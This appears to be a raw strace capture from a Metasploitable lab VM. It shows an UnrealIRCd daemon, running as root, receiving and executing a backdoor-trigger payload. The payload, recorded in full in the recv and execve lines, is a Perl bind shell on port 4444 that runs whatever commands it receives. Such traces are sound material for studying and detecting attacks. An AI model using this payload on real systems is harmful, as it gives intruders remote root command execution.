4519  07:41:49.830720 select(1024, [2 3 4 7 9], [], NULL, {0, 470000}) = 1 (in [2], left {0, 300000})
4519  07:41:49.998877 clock_gettime(CLOCK_MONOTONIC, {2919, 815905753}) = 0
4519  07:41:49.998917 time(NULL)        = 1495626109
4519  07:41:49.998939 time(NULL)        = 1495626109
4519  07:41:49.998960 gettimeofday({1495626109, 998964}, NULL) = 0
4519  07:41:49.998972 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:41:49.999012 clock_gettime(CLOCK_MONOTONIC, {2919, 816025117}) = 0
4519  07:41:49.999022 gettimeofday({1495626109, 999026}, NULL) = 0
4519  07:41:49.999033 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:41:49.999072 clock_gettime(CLOCK_MONOTONIC, {2919, 816085117}) = 0
4519  07:41:49.999083 accept(2, 0, NULL) = 5
4519  07:41:49.999104 getpeername(5, {sa_family=AF_INET, sin_port=htons(41809), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:41:49.999135 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:41:49.999148 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:41:49.999161 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:41:49.999173 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:41:49.999184 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:41:49.999196 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:41:49.999210 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:41:49.999324 clock_gettime(CLOCK_MONOTONIC, {2919, 816354846}) = 0
4519  07:41:49.999354 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:41:49.999367 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:41:49.999377 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:41:49.999386 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:41:49.999396 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:41:49.999413 send(6, "\267\213\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:41:49.999510 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:41:49.999546 gettimeofday({1495626109, 999551}, NULL) = 0
4519  07:41:49.999558 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:41:50.006387 clock_gettime(CLOCK_MONOTONIC, {2919, 823417904}) = 0
4519  07:41:50.006440 recvfrom(6, "\267\213\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0?\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:41:50.006603 close(6)          = 0
4519  07:41:50.006622 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:41:50.006636 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:41:50.006735 time(NULL)        = 1495626110
4519  07:41:50.006774 time(NULL)        = 1495626110
4519  07:41:50.006804 gettimeofday({1495626110, 6808}, NULL) = 0
4519  07:41:50.006830 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:41:50.006879 clock_gettime(CLOCK_MONOTONIC, {2919, 823949617}) = 0
4519  07:41:50.006948 gettimeofday({1495626110, 6952}, NULL) = 0
4519  07:41:50.006960 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {0, 990000})
4519  07:41:50.016279 clock_gettime(CLOCK_MONOTONIC, {2919, 833329745}) = 0
4519  07:41:50.016378 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:41:50.016441 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:41:50.016480 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:41:50.016505 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:41:50.016537 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 12316
12316 07:41:50.016608 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
12316 07:41:50.016623 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
12316 07:41:50.016634 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12316 07:41:50.016648 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
12316 07:41:50.016754 brk(0)            = 0x80f9000
12316 07:41:50.016775 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.016842 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f8b000
12316 07:41:50.016860 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.016878 open("/etc/ld.so.cache", O_RDONLY) = 1
12316 07:41:50.016891 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12316 07:41:50.016911 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f83000
12316 07:41:50.016921 close(1)          = 0
12316 07:41:50.016932 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.016948 open("/lib/libncurses.so.5", O_RDONLY) = 1
12316 07:41:50.016961 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
12316 07:41:50.017057 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
12316 07:41:50.017074 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f53000
12316 07:41:50.017087 mmap2(0xb7f80000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f80000
12316 07:41:50.017104 close(1)          = 0
12316 07:41:50.017116 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.017130 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12316 07:41:50.017144 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12316 07:41:50.017238 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12316 07:41:50.017255 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f4f000
12316 07:41:50.017267 mmap2(0xb7f51000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f51000
12316 07:41:50.017329 close(1)          = 0
12316 07:41:50.017342 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.017356 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12316 07:41:50.017371 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12316 07:41:50.017460 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12316 07:41:50.017477 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f4e000
12316 07:41:50.017491 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dff000
12316 07:41:50.017502 mmap2(0xb7f48000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f48000
12316 07:41:50.017516 mmap2(0xb7f4b000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f4b000
12316 07:41:50.017530 close(1)          = 0
12316 07:41:50.017554 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dfe000
12316 07:41:50.017566 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dfe6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12316 07:41:50.017622 mprotect(0xb7f48000, 4096, PROT_READ) = 0
12316 07:41:50.017659 munmap(0xb7f83000, 29913) = 0
12316 07:41:50.017689 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12316 07:41:50.017703 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
12316 07:41:50.017723 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc235e0) = -1 ENOTTY (Inappropriate ioctl for device)
12316 07:41:50.017754 brk(0)            = 0x80f9000
12316 07:41:50.017763 brk(0x80fa000)    = 0x80fa000
12316 07:41:50.017873 brk(0x80fb000)    = 0x80fb000
12316 07:41:50.017897 getuid32()        = 0
12316 07:41:50.017921 getgid32()        = 0
12316 07:41:50.017930 geteuid32()       = 0
12316 07:41:50.017939 getegid32()       = 0
12316 07:41:50.017953 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12316 07:41:50.017967 time(NULL)        = 1495626110
12316 07:41:50.017980 brk(0x80fc000)    = 0x80fc000
12316 07:41:50.017994 brk(0x80fd000)    = 0x80fd000
12316 07:41:50.018014 open("/proc/meminfo", O_RDONLY) = 1
12316 07:41:50.018037 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
12316 07:41:50.018056 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f8a000
12316 07:41:50.018067 read(1, "MemTotal:      1035240 kB\nMemFree:        325624 kB\nBuffers:         87632 kB\nCached:         460856 kB\nSwapCached:          0 kB\nActive:         257896 kB\nInactive:       419516 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        325384 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4936 kB\nWriteback:           0 kB\nAnonPages:      128976 kB\nMapped:          52004 kB\nSlab:            20896 kB\nSReclaimable:    12076 kB\nSUnreclaim:       8820 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
12316 07:41:50.018156 close(1)          = 0
12316 07:41:50.018167 munmap(0xb7f8a000, 4096) = 0
12316 07:41:50.018179 brk(0x80fe000)    = 0x80fe000
12316 07:41:50.018206 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12316 07:41:50.018219 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12316 07:41:50.018231 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12316 07:41:50.018243 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12316 07:41:50.018255 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
12316 07:41:50.018267 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
12316 07:41:50.018281 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12316 07:41:50.018292 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12316 07:41:50.018305 uname({sys="Linux", node="metasploitable", ...}) = 0
12316 07:41:50.018397 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12316 07:41:50.018418 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12316 07:41:50.018437 brk(0x8100000)    = 0x8100000
12316 07:41:50.018450 getcwd("/etc/unreal", 4096) = 12
12316 07:41:50.018478 getpid()          = 12316
12316 07:41:50.018494 getppid()         = 4519
12316 07:41:50.018510 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12316 07:41:50.018530 stat64("/sbin/sh", 0xbfc235b8) = -1 ENOENT (No such file or directory)
12316 07:41:50.018543 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12316 07:41:50.018561 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12316 07:41:50.018586 socket(PF_FILE, SOCK_STREAM, 0) = 1
12316 07:41:50.018600 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12316 07:41:50.018612 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12316 07:41:50.018635 close(1)          = 0
12316 07:41:50.018646 socket(PF_FILE, SOCK_STREAM, 0) = 1
12316 07:41:50.018657 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12316 07:41:50.018667 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12316 07:41:50.018685 close(1)          = 0
12316 07:41:50.018698 open("/etc/nsswitch.conf", O_RDONLY) = 1
12316 07:41:50.018713 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12316 07:41:50.018730 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f8a000
12316 07:41:50.018741 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12316 07:41:50.018791 read(1, "", 4096) = 0
12316 07:41:50.018800 close(1)          = 0
12316 07:41:50.018810 munmap(0xb7f8a000, 4096) = 0
12316 07:41:50.018826 open("/etc/ld.so.cache", O_RDONLY) = 1
12316 07:41:50.018866 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12316 07:41:50.018898 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f83000
12316 07:41:50.018912 close(1)          = 0
12316 07:41:50.018923 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.018938 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
12316 07:41:50.018953 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
12316 07:41:50.019043 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
12316 07:41:50.019061 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df5000
12316 07:41:50.019072 mmap2(0xb7dfc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7dfc000
12316 07:41:50.019090 close(1)          = 0
12316 07:41:50.019102 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.019115 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
12316 07:41:50.019129 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
12316 07:41:50.019217 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
12316 07:41:50.019234 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ddd000
12316 07:41:50.019245 mmap2(0xb7df1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7df1000
12316 07:41:50.019261 mmap2(0xb7df3000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7df3000
12316 07:41:50.019275 close(1)          = 0
12316 07:41:50.019302 munmap(0xb7f83000, 29913) = 0
12316 07:41:50.019319 open("/etc/ld.so.cache", O_RDONLY) = 1
12316 07:41:50.019332 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12316 07:41:50.019391 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f83000
12316 07:41:50.019402 close(1)          = 0
12316 07:41:50.019413 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.019428 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
12316 07:41:50.019442 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
